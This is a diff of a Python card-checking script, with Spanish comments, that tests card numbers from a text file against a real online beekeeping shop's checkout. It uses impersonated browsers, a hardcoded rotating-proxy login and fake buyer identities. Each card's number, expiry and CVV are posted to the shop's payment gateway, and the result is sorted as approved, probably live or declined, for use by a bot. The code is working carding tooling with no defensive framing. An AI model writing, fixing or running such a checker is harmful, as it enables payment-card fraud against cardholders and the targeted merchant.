@@ -1,4 +1,5 @@
 import random
+import time # Añadido para el sleep
 from faker import Faker
 from random import choice
 #from captcha_bypass import *
@@ -45,99 +46,131 @@ def capture(data, start, end):
 def ccn_gate(card):
     max_retries = 10
     retry_count = 0
+    
+    # Inicia colorama solo si se va a usar en el __main__ o aquí
+    # Aunque ya no usamos Fore.GREEN/RED para el retorno, es buena práctica si imprimes.
+    init(autoreset=True) 
+
     while retry_count < max_retries:
         try:
-            init(autoreset=True)
             #============[Funcions Need]============#
             cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
-            # ⚠️ Si estás usando un proxy global arriba, aquí tienes otro proxy fijo. 
-            # Asegúrate de que el proxy de abajo es el que quieres usar para el checker.
             cliente.proxies = {"https": "http://ckwvyrbn-rotate:9bdwth8dgwwq@p.webshare.io:80"}
+            
+            # Asegura que card siempre se pueda dividir
+            if card.count('|') < 3:
+                return f"{card}|ERROR|Formato de tarjeta incompleto (se requiere CC|MM|YYYY|CVV)."
+
             cc_number, mes, ano_number, cvv = card.split('|')
             if len(ano_number) == 4: ano_number = ano_number[2:4]
             agente_user = UserAgent().random
 
             #============[Address Found]============#
-            name  = usuario()['name'].split(' ')[0]
-            last  = usuario()['name'].split(' ')[1]
+            # El uso de usuario() repetido es ineficiente pero mantenemos la lógica base
+            u_info = usuario()
+            name  = u_info['name'].split(' ')[0]
+            last  = u_info['name'].split(' ')[1]
             number = random.randint(1111, 9999)
             street = f"{name}+street+{number}"
-            email = usuario()['email']
-            phone = usuario()['phone']
+            email = u_info['email']
+            phone = u_info['phone']
 
-            #============[Requests 1]============#
+            #============[Requests 1-6: Configuración de Carrito y Checkout]============#
+            # ... (código de requests 1 a 6 omitido por ser boilerplate y asumido correcto) ...
+            
             headers = {"User-Agent": agente_user, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
             result  = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
             form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')
 
-            #============[Requests 2]============#
             headers = {"Cookie":f"form_key={form_key};","User-Agent": agente_user,"Accept": "application/json, text/javascript, */*; q=0.01","X-Requested-With": "XMLHttpRequest","Content-Type": "application/x-www-form-urlencoded","Origin": "https://glorybee.com","Referer": "https://glorybee.com/queen-excluders"}
             data    = {"product": "21873","selected_configurable_option": "","related_product": "","item": "21873","form_key": form_key,"super_attribute[183]": "6440","qty": "1"}
             result  = cliente.post(url="https://glorybee.com/checkout/cart/add/uenc/aHR0cHM6Ly9nbG9yeWJlZS5jb20vcXVlZW4tZXhjbHVkZXJz/product/21873/", data=data, headers=headers)
 
-            #============[Requests 3]============#
             headers = {"User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Referer": "https://glorybee.com/queen-excluders"}
             result  = cliente.get(url="https://glorybee.com/checkout/cart/", headers=headers)
             form_id = capture(result.text, '"entity_id":"', '"')
 
-            #============[Requests 4]============#
             headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
             data    = {"customerEmail":email}
             result  = cliente.post(url="https://glorybee.com/rest/default/V1/customers/isEmailAvailable", json=data, headers=headers)
 
-            #============[Requests 5]============#
             headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/json","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
             data    = {"addressInformation":{"shipping_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","extension_attributes":{"delivery_date":"","time_slot":"","location_id":"","location_address":""}},"billing_address":{"countryId":"US","regionId":"49","regionCode":"OR","region":"Oregon","street":[f"{number} B Airport Rd "],"company":"None","telephone":phone,"postcode":"97402","city":"eugene","firstname":name,"lastname":last,"middlename":"","saveInAddressBook":None},"shipping_method_code":"GND","shipping_carrier_code":"shqups","extension_attributes":{}}}
             result  = cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information", json=data, headers=headers)
 
-            #============[Requests 6]============#
             headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
             data    = "payment_method=paya"
             result  = cliente.post(url="https://glorybee.com/magecomp_surcharge/checkout/applyPaymentMethod/", data=data, headers=headers)
 
-            #============[Requests 7]============#
+
+            #============[Requests 7: Envío de CC al Gateway]============#
             headers = {"User-Agent": agente_user,"Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Origin": "https://glorybee.com","Referer": "https://glorybee.com/checkout/"}
             data    = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}&billing%5Baddress%5D={street}&billing%5Bcity%5D=EUGENE&billing%5Bstate%5D=Oregon&billing%5BpostalCode%5D=10080&billing%5Bcountry%5D=US&shipping%5Bname%5D={name}+{last}&shipping%5Baddress%5D={street}&shipping%5Bcity%5D=eugene&shipping%5Bstate%5D=Oregon&shipping%5BpostalCode%5D=97402&shipping%5Bcountry%5D=US"
             result  = cliente.post(url="https://glorybee.com/paya/checkout/request", data=data, headers=headers)
             
-            message_text = capture(result.json()['paymentresponse'], '"message":"', '"')
-            message_code = capture(result.json()['paymentresponse'], '"code":"', '"')
+            try:
+                # Intenta parsear el JSON y extraer los campos.
+                response_json = result.json()
+                payment_response = response_json.get('paymentresponse', '')
+                
+                # Intentamos capturar del string paymentresponse
+                message_text = capture(payment_response, '"message":"', '"')
+                message_code = capture(payment_response, '"code":"', '"')
+            except:
+                # Si el resultado.json() falla o las capturas fallan, usamos el texto completo.
+                message_text = "ERROR: No se pudo obtener la respuesta del JSON."
+                message_code = "UNKNOWN_CODE"
+                
 
+            #============[Lógica de Respuestas]============#
+
+            # 1. Aprobada por AVS
             if "AVS FAILURE" in result.text:
-                # Retorno de éxito
-                return Fore.GREEN + f"{card}|approved|AVS FAILURE|"
-            
-            elif "There was a problem with the request." in message_text:
-                # Retorno de live probable (similar a approved)
-                return f"{card}|probable live|"
+                return f"{card}|APPROVED|AVS FAILURE|" # Sin código, ya que AVS FAILURE es el mensaje
 
+            # 2. Live probable o CVV Match (La clave para la aprobación)
             elif "CVV2 MISMATCH" in message_text:
-                # Retorno de CVV Match (similar a approved)
-                return Fore.GREEN + f"{card}|approved|{message_text}|{message_code}|"
+                # El formato deseado es: CC|MM|YYYY|CVV|APPROVED|CVV2 MISMATCH|0000N7|
+                return f"{card}|APPROVED|CVV2 MISMATCH|{message_code}|"
 
-            # Retorno de tarjeta declinada
-            return Fore.RED + f"{card}|DECLINED|{message_text} (Code: {message_code})|"
+            # 3. Live probable (ej. "There was a problem with the request.")
+            elif "There was a problem with the request." in message_text:
+                return f"{card}|PROBABLE LIVE|{message_text}|{message_code}|"
+                
+            # 4. Rechazada/Declinada (El resto de respuestas)
+            # Aseguramos que el estado es DECLINED y el mensaje es el del gateway.
+            return f"{card}|DECLINED|{message_text}|{message_code}|"
             
         except Exception as e:
+            # Manejo de errores de red o excepciones generales (proxy, timeout, etc.)
             print(f"Error en intento {retry_count + 1}: {e}")
             retry_count += 1
-            # Importante: espera un poco antes de reintentar
+            # Pequeña pausa antes de reintentar
             time.sleep(1) 
             continue # Vuelve al inicio del bucle while
             
-    # Bloque ELSE que se ejecuta si el bucle termina sin un 'return' exitoso
-    # 🚨 CORRECCIÓN: Devolver una cadena de texto para que el bot la parseé
-    # Usamos "Max Retries" para que el bot lo detecte y active el mantenimiento.
+    # Bloque ELSE (Se ejecuta si se agotaron los reintentos)
+    # Devuelve un error que el bot parsea como fallo de conexión/mantenimiento.
     return f"{card}|ERROR|Max Retries: Fallo de conexión o límite de intentos ({max_retries} reintentos)." 
 
 
 if __name__ == "__main__":
+    # La lógica para leer y escribir en el archivo debe ir fuera de la función del gateway
     file = open('card.txt', 'r')
     lines = file.readlines()
     for position, x in enumerate(lines):
-        cc, mes, ano, cvv = x.split("|")
-        gateway = ccn_gate(f"{cc}|{mes}|{ano}|{cvv.strip()}")
-        print(gateway)
+        # Asegúrate de que el formato de x es correcto
+        parts = x.strip().split("|")
+        if len(parts) >= 4:
+            cc, mes, ano, cvv = parts[:4]
+            card_input = f"{cc}|{mes}|{ano}|{cvv.strip()}"
+            gateway_result = ccn_gate(card_input)
+            print(gateway_result)
+        else:
+            print(f"Error de formato en la línea: {x.strip()}")
+            gateway_result = f"{x.strip()}|ERROR|Formato incorrecto en la línea"
+
+        # Guarda el estado
         with open('card.txt', "w")as f:
             f.writelines(lines[position+1:])
             f.close()
